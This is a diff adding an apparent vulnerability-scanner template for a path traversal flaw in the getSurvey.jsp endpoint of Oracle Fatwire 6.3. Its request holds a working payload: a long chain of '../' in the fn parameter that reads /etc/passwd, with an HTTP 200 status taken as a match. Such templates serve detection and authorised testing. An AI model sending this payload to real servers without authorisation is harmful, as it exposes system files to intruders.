@@ -1,0 +1,21 @@
+id: oracle-fatwire-lfi
+brief:
+    title: Oracle Fatwire 6.3 - Path Traversal
+    by: Bernardo Rodrigues @bernardofsr
+    level: high
+    about: Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint.
+    label:
+        - lfi
+        - oracle
+        - fatwire
+        - edb
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
